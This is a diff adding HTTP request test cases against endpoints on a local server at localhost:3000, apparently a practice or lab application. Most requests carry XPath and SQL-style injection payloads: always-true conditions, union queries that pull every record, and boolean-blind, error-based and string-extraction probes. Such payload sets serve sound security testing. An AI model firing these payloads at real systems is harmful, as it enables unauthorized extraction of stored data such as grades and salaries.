@@ -22,3 +22,73 @@ GET http://localhost:3000/book?isbn=" or "1"="1 HTTP/1.1
 
 ###5
 GET http://localhost:3000/employee/salary?employeeId=" or "1"="1 HTTP/1.1
+
+###sec7
+### 1. Normal request
+GET http://localhost:3000/stock?productCode=PROD001
+Accept: application/json
+
+### 2. Classic XPath Injection - returns first product's stock
+GET http://localhost:3000/stock?productCode=PROD001" or "1"="1
+Accept: application/json
+# @expect: 200 OK
+# XPath becomes: //product[code="PROD001" or "1"="1"]/stock/text()
+
+### 3. Get all stock values (XPath union attack)
+GET http://localhost:3000/stock?productCode=PROD001"] | //product/stock/text() | //product[code="
+Accept: application/json
+# @expect: 200 OK
+# Returns all stock values through XPath union
+
+### 4. Boolean-based blind injection
+GET http://localhost:3000/stock?productCode=PROD001" and contains(name,"Premium") and "1"="1
+Accept: application/json
+# @expect: 200 OK if product name contains "Premium"
+
+### 5. Error-based injection attempt
+GET http://localhost:3000/stock?productCode=PROD001" and 1=count(/*) and "1"="1
+Accept: application/json
+# @expect: 200 OK or 404 depending on XML structure
+
+### 6. Empty parameter
+GET http://localhost:3000/stock
+Accept: application/json
+# @expect: 400 Bad Request
+
+### 7. Extreme injection - try to read all data
+GET http://localhost:3000/stock?productCode=PROD001"]/parent::* | //*[not(self::code)]/text() | //product[code="
+Accept: application/json
+# @expect: 200 OK with potentially sensitive data
+
+###vul8
+### 1. Normal Request
+GET http://localhost:3000/grades?studentId=s1001
+Accept: application/json
+
+### 2. Basic XPath Injection - Always True
+GET http://localhost:3000/grades?studentId=s1001' or '1'='1
+Accept: application/json
+
+### 3. Get All Students
+GET http://localhost:3000/grades?studentId=' or 1=1 or '
+Accept: application/json
+
+### 4. Union Attack
+GET http://localhost:3000/grades?studentId=x']|//*|//*['
+Accept: application/json
+
+### 5. Comment Attack
+GET http://localhost:3000/grades?studentId=s1001']|//student[1]|//*['
+Accept: application/json
+
+### 6. Boolean Blind
+GET http://localhost:3000/grades?studentId=s1001' and substring(name,1,1)='A' or '
+Accept: application/json
+
+### 7. Error Based
+GET http://localhost:3000/grades?studentId=s1001' and 1=count(//*) or '
+Accept: application/json
+
+### 8. String Extraction
+GET http://localhost:3000/grades?studentId=s1001' and starts-with(name,'A') or '
+Accept: application/json
